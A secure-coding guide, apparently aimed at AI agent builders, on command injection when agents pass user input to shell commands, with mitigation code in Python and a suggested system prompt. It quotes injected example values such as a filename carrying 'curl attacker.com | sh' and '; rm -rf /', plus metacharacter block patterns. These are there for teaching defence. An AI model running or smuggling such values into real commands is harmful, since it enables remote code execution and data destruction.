---
layout: solution
title: "Agent Runs Shell Command Without Sanitizing Input — Command Injection Risk"
category: general
description: "Agent constructs a shell command using user-provided input and runs it with subprocess or os.system. Attacker passes '; rm -rf /' as a filename. Agent executes arbitrary commands with its own permissions."
tags: [security, command-injection, shell, subprocess, sanitization, owasp, injection]
---

# Agent Runs Shell Command Without Sanitizing Input — Command Injection Risk

## Symptom
- Agent runs `os.system(f"convert {user_filename} output.pdf")` — user passes `file.jpg; curl attacker.com | sh`
- Shell interpolation executes injected commands with agent's full permissions
- Log files show unexpected commands executed after agent processes certain inputs
- Agent with write access to filesystem or network can be leveraged as an attack vector
- Security audit flags unsanitized `subprocess.run(shell=True, ...)` with user input

## Root Cause
Using `shell=True` with user-controlled input passes the string to `/bin/sh -c`, which interprets shell metacharacters: `;`, `&&`, `||`, `$()`, backticks, `|`, `>`, `<`, `&`. Any of these in user input can inject additional commands. This is OWASP A03:2021 Injection.

## Fix

### Option 1: Never use shell=True with user input — pass args as list

```python
import subprocess

# VULNERABLE: shell=True with user input
def convert_file_vulnerable(filename: str) -> None:
    os.system(f"convert {filename} output.pdf")          # BAD
    subprocess.run(f"convert {filename} output.pdf", shell=True)  # ALSO BAD

# SAFE: pass arguments as a list — no shell interpolation
def convert_file_safe(filename: str, output_path: str) -> subprocess.CompletedProcess:
    result = subprocess.run(
        ["convert", filename, output_path],  # Each arg is a separate element
        capture_output=True,
        text=True,
        timeout=30,
        # No shell=True — args list bypasses shell interpretation entirely
    )
    if result.returncode != 0:
        raise RuntimeError(f"convert failed: {result.stderr}")
    return result

# With list args, filename="; rm -rf /" is passed as a literal argument
# to convert, not to the shell. The injection attempt fails harmlessly.
```

### Option 2: Validate and allowlist filenames before use in commands

```python
import re
import os
from pathlib import Path

SAFE_FILENAME_PATTERN = re.compile(r'^[a-zA-Z0-9._\- ]+$')
ALLOWED_EXTENSIONS = {".jpg", ".jpeg", ".png", ".gif", ".pdf", ".txt", ".csv"}

def validate_filename(filename: str, base_dir: str = "/app/uploads") -> Path:
    """
    Validate that a filename is safe for use in filesystem/shell operations.
    Raises ValueError if the filename contains dangerous characters.
    """
    # Reject shell metacharacters
    if not SAFE_FILENAME_PATTERN.match(filename):
        raise ValueError(
            f"Invalid filename '{filename}': only alphanumeric, dots, dashes, "
            f"underscores, and spaces are allowed"
        )

    # Reject path traversal
    if ".." in filename or filename.startswith("/"):
        raise ValueError(f"Path traversal attempt detected in filename: '{filename}'")

    # Reject disallowed extensions
    ext = Path(filename).suffix.lower()
    if ext not in ALLOWED_EXTENSIONS:
        raise ValueError(f"File extension '{ext}' not allowed. Allowed: {ALLOWED_EXTENSIONS}")

    # Resolve to absolute path and verify it stays within base_dir
    safe_path = Path(base_dir).resolve() / filename
    if not str(safe_path).startswith(str(Path(base_dir).resolve())):
        raise ValueError(f"Path escapes base directory: {safe_path}")

    return safe_path

def process_user_file(user_filename: str) -> dict:
    path = validate_filename(user_filename)  # Raises on bad input
    result = subprocess.run(
        ["wc", "-l", str(path)],
        capture_output=True, text=True, timeout=10
    )
    return {"lines": result.stdout.strip(), "file": str(path)}
```

### Option 3: Use Python APIs instead of shell commands

```python
import shutil
import os
from pathlib import Path

# AVOID: shell commands for file operations
def move_file_shell(src: str, dst: str):
    os.system(f"mv {src} {dst}")           # Injection risk

# PREFER: Python stdlib — no shell involvement
def move_file_safe(src: str, dst: str):
    shutil.move(src, dst)                   # No shell, no injection possible

# Common replacements:
# os.system("cp src dst")      → shutil.copy(src, dst)
# os.system("rm file")         → os.unlink(file) or Path(file).unlink()
# os.system("mkdir -p dir")    → Path(dir).mkdir(parents=True, exist_ok=True)
# os.system("grep pattern file") → Use Python re module
# os.system("ls dir")          → Path(dir).iterdir()
# os.system("cat file")        → Path(file).read_text()
# os.system("wc -l file")      → len(Path(file).read_text().splitlines())
# os.system("find . -name X")  → Path(".").rglob(X)
```

### Option 4: Sandbox agent shell access with restricted subprocess wrapper

```python
import subprocess
from typing import Sequence

ALLOWED_COMMANDS = {
    "convert", "ffmpeg", "pdftotext", "pandoc",
    "wc", "head", "tail", "sort", "uniq",
}

BLOCKED_ARGS_PATTERNS = [
    r"[;&|`$]",          # Shell metacharacters
    r"\.\./",            # Path traversal
    r"^-",               # Flags starting with - (allow only specific ones via allowlist)
]

def safe_subprocess(
    args: Sequence[str],
    timeout: int = 30,
    cwd: str = "/app/sandbox",
) -> subprocess.CompletedProcess:
    """
    Restricted subprocess wrapper for agent tool use.
    Allowlists commands and validates arguments.
    """
    if not args:
        raise ValueError("Empty command")

    command = args[0]
    if command not in ALLOWED_COMMANDS:
        raise PermissionError(
            f"Command '{command}' not allowed. "
            f"Allowed commands: {sorted(ALLOWED_COMMANDS)}"
        )

    # Check all arguments for dangerous patterns
    for arg in args[1:]:
        for pattern in BLOCKED_ARGS_PATTERNS:
            if re.search(pattern, str(arg)):
                raise ValueError(
                    f"Argument '{arg}' contains blocked pattern '{pattern}'"
                )

    return subprocess.run(
        list(args),
        capture_output=True,
        text=True,
        timeout=timeout,
        cwd=cwd,
        shell=False,       # ALWAYS False in the wrapper
        env={"PATH": "/usr/bin:/usr/local/bin"},  # Minimal environment
    )

# Agent can only call allowed commands with safe arguments
result = safe_subprocess(["convert", "photo.jpg", "output.pdf"])
```

### Option 5: Use shlex.quote for unavoidable shell=True cases

```python
import shlex
import subprocess

# If shell=True is absolutely unavoidable (e.g., shell pipelines),
# use shlex.quote() to escape user input
def search_in_file_shell(filepath: str, pattern: str) -> str:
    """
    Example of shlex.quote for unavoidable shell usage.
    Prefer subprocess list args instead when possible.
    """
    # shlex.quote wraps value in single quotes and escapes internal single quotes
    safe_path = shlex.quote(filepath)
    safe_pattern = shlex.quote(pattern)

    # Now safe: shlex.quote("file; rm -rf /") → "'file; rm -rf /'"
    cmd = f"grep -n {safe_pattern} {safe_path}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
    return result.stdout

# Demonstration:
print(shlex.quote("normal_file.txt"))        # → 'normal_file.txt'
print(shlex.quote("file; rm -rf /"))         # → 'file; rm -rf /'  (quoted, safe)
print(shlex.quote("$(curl attacker.com)"))   # → '$(curl attacker.com)' (quoted, safe)
```

### Option 6: System prompt injection prevention for agent-driven shell use

```
System prompt:
"Shell command rules:

1. Never construct shell commands by concatenating user-provided strings.
   WRONG: f'grep {user_query} {user_file}'
   RIGHT: subprocess.run(['grep', user_query, user_file], shell=False)

2. When running commands that process user-provided filenames or strings:
   - Validate the value first (alphanumeric + limited punctuation only)
   - Pass as a list argument to subprocess — never interpolate into shell strings
   - Reject inputs containing: ; & | ` $ ( ) < > ' \" \\ ../

3. Prefer Python stdlib over shell commands:
   - File operations: use pathlib, shutil, os
   - Text processing: use re, str methods
   - Only use subprocess when no Python alternative exists

4. Never use os.system() — always use subprocess.run() with shell=False"
```

## Command Injection Risk Matrix

| Pattern | Risk | Safe Alternative |
|---|---|---|
| `os.system(f"cmd {user_input}")` | Critical | `subprocess.run(["cmd", user_input])` |
| `subprocess.run(cmd, shell=True)` with user input | Critical | Pass as list, `shell=False` |
| `eval(user_code)` | Critical | Sandbox or refuse |
| `exec(user_code)` | Critical | Sandbox or refuse |
| `shlex.quote(user_input)` + shell=True | Low | Still prefer list args |
| `subprocess.run(["cmd", user_input])` | None | Standard safe pattern |

## Expected Token Savings
Security incident investigation + remediation: ~100,000+ tokens (plus reputational cost)
Input validation + list args prevents injection entirely: 0 extra tokens

## Environment
- Any agent that processes user-provided filenames, queries, or strings in shell commands
- Source: OWASP A03:2021 Injection; direct experience auditing agent security
